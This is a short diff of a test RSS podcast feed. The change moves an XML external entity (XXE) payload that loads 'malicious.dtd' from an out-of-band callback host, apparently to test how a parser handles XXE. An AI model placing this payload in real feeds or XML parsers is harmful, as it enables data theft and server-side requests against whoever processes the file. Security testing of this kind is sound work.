@@ -1,8 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0"
     xmlns:xtest="http://www.itunes.com/dtds/podcast-1.0.dtd">
-  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
-"http://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/malicious.dtd"> %xxe;]>
   <channel>
     <title>Test's Zebra Podcast</title>
     <xtest:owner>
@@ -32,4 +30,6 @@
       <guid>dzpodclean</guid>
     </item>
   </channel>
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/malicious.dtd"> %xxe;]>
 </rss>
